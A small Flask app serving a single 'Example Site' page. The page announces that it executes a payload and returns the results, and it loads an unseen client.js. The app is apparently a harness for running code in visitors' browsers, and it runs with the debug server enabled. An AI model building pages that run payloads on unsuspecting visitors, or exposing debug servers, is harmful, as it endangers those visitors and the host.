from flask import Flask, render_template_string
from flask_cors import CORS, cross_origin
app = Flask(__name__)
app.config['CORS_HEADERS'] = 'Content-Type'

@app.route("/")
def hello():
    return render_template_string("""
        <!doctype html>
            <html>
            <head>
                <title>Example Site</title>
                <meta charset="utf-8" />
                <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                <style type="text/css">
                body {
                    background-color: #f0f0f2;
                    margin: 0;
                    padding: 0;
                    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;

                }
                div {
                    width: 600px;
                    margin: 5em auto;
                    padding: 50px;
                    background-color: #fff;
                    border-radius: 1em;
                }
                a:link, a:visited {
                    color: #38488f;
                    text-decoration: none;
                }
                @media (max-width: 700px) {
                    body {
                        background-color: #fff;
                    }
                    div {
                        width: auto;
                        margin: 0 auto;
                        border-radius: 0;
                        padding: 1em;
                    }
                }
                </style>
            </head>

            <body>
                <div>
                    <h1>Example Site</h1>
                    <p>Every instance of this site will execute some payload and return the results back.</p><br>
                </div>
                <script type="text/javascript" src="static/client.js"></script>
            </body>
            </html>
        """)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
